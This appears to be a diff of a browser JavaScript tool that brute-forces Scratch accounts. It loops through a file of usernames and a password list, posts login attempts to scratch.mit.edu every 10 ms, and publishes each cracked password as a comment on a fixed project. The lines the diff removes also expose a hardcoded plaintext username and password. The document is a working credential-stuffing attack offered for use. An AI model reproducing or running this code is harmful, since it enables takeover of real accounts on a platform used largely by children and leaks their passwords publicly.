@@ -8,31 +8,35 @@ input.addEventListener('change', () => {
     for(file of input.files){
         reader.readAsText(file, 'UTF-8');
         reader.onload = ()=> {
-            const flw = async (index) => {
-              let token="";
-              {
-                  let cookie=document.cookie;
-                  cookie=cookie.split(';');
-                  let cok=[[],[]];
-                  cookie.forEach(function(element){
-                      const elements=element.split("=");
-                      cok[0].push(elements[0]);
-                      cok[1].push(elements[1]);
-                  });
-                  token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
-              }
-            let username="yamaguchi03";
-            let password="yharu0301";
-            fetch("https://scratch.mit.edu/accounts/login/",
-            {method:"POST",
-            body:JSON.stringify({"username":username,"password":password,"useMessages":false}),
-            "headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
+            const flw = async (username,password) => {
+                let res=await fetch("https://scratch.mit.edu/login/", {headers: {"x-csrftoken": "a","x-requested-with": "XMLHttpRequest","Cookie": "scratchcsrftoken=a;scratchlanguage=en;","referer": "https://scratch.mit.edu"},body: JSON.stringify({ username, password, useMessages: true }),method: "POST"});
+                if(res.status==200){
+                    const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest","referer": "https://scratch.mit.edu"}})).json()).user.token;
+                    let projectid="585027038";
+                    let contents=password;
+                    fetch(`https://api.scratch.mit.edu/proxy/comments/project/${projectid}`,{
+                      method: "POST",
+                      body: JSON.stringify({
+                        content: contents,
+                        parent_id: "",//返信する場合はルートのコメントのコメントID ( String )
+                        commentee_id: ""//返信する場合はルートのコメントのユーザーID ( String )
+                      }),
+                      headers: {
+                        'X-CSRFToken': "a",
+                        'x-token':sessiontoken,
+                        "Cookie": "scratchcsrftoken=a;scratchlanguage=en;",
+                        "referer": "https://scratch.mit.edu"
+                      }
+                    });
+                }
             }
             let prom=reader.result.split("\n");
             let setint=setInterval(follow,10);
             let i=prompt("何人目から始めますか?");
             function follow(){
-                flw(i)
+                for(let a=0;a<passwordlist.length;a++){
+                    flw(prom[i],passwordlist[a]);
+                }
                 i++;
                 if(i>prom.length){
                     clearInterval(setint);
